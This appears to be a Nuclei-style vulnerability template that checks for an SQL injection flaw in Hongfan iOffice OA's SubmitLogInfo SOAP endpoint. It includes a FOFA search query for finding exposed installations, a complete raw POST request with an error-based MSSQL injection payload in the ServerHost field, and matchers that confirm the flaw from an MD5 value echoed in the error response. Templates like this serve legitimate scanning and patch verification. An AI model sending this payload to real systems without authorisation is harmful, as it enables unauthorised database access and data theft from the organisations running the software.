folder-6/poc-yaml-hongfan-oa-submitloginfo-sqli.yaml

id: poc-yaml-hongfan-oa-submitloginfo-sqli
info:
  name: 红帆OA SubmitLogInfo SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: iOffice
    fofa-query: app="红帆-ioffice"

variables:
  t1: "{{rand_int(1000,9999)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /iOffice/prg/set/wss/wssRtSyn.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml

        <?xml version="1.0"?>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://iOffice.net/iOffice/ioRtSyn">
        <soap:Header />
        <soap:Body>
        <tns:SubmitLogInfo>
        <tns:data>TzwSVsOw</tns:data>
        <tns:ServerHost>' AND 1453 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(120)+CHAR(113)+CHAR(113)+(SELECT SUBSTRING((ISNULL(CAST(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{t1}}')) AS NVARCHAR(4000)),CHAR(32))),1,1024))+CHAR(113)+CHAR(120)+CHAR(98)+CHAR(118)+CHAR(113)))-- PybQ</tns:ServerHost>
        </tns:SubmitLogInfo>
        </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500

      - type: word
        part: body
        words:
          - "nvarchar"
          - "{{t2}}"
